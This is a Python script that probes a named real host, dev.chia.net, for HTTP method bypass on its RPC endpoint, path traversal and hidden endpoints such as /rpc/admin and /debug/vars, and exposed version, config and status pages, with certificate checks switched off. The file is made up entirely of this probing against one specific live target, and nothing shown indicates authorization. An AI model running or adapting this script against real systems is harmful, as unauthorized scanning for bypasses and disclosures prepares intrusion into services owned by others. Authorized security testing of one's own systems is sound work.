#!/usr/bin/env python3
import requests

print("[*] Testing HTTP method bypass on Chia RPC\n")

rpc = "https://dev.chia.net/rpc"

# Try different HTTP methods
methods = {
    "GET": "Standard GET",
    "HEAD": "HEAD request",
    "OPTIONS": "OPTIONS (CORS preflight)",
    "TRACE": "TRACE method",
    "PUT": "PUT method",
    "DELETE": "DELETE method",
    "PATCH": "PATCH method",
}

payload = {
    "jsonrpc": "2.0",
    "id": "test",
    "method": "get_blockchain_state",
    "params": {}
}

print("[*] Testing HTTP method bypass:\n")

for method, desc in methods.items():
    try:
        if method == "GET":
            r = requests.request(method, rpc, params=payload, timeout=5, verify=False)
        elif method == "HEAD":
            r = requests.head(rpc, timeout=5, verify=False)
        elif method == "OPTIONS":
            r = requests.options(rpc, timeout=5, verify=False)
        else:
            r = requests.request(method, rpc, json=payload, timeout=5, verify=False)
        
        print(f"[{r.status_code}] {method:6} - {desc}")
        
        if r.status_code < 400:
            print(f"      Response: {r.text[:100]}")
    except Exception as e:
        print(f"[✗] {method:6} - {str(e)[:50]}")

# Try path traversal / endpoint discovery
print("\n[*] Testing path traversal on Chia domains:\n")

paths = [
    "/rpc/..",
    "/rpc/./",
    "/rpc%2F..",
    "//rpc//",
    "/rpc;/",
    "/rpc/admin",
    "/rpc/internal",
    "/rpc/debug",
    "/api/rpc",
    "/graphql",
    "/rest/api",
]

for path in paths:
    try:
        r = requests.get(f"https://dev.chia.net{path}", timeout=5, verify=False)
        if r.status_code != 404:
            print(f"[{r.status_code}] {path}")
    except:
        pass

# Check for version/info disclosure
print("\n[*] Checking for version/info endpoints:\n")

info_endpoints = [
    "/version",
    "/info",
    "/status",
    "/health",
    "/.well-known/",
    "/config",
    "/debug/vars",
]

for ep in info_endpoints:
    try:
        r = requests.get(f"https://dev.chia.net{ep}", timeout=5, verify=False)
        if r.status_code == 200:
            print(f"[✅] {ep}: {r.text[:150]}")
    except:
        pass

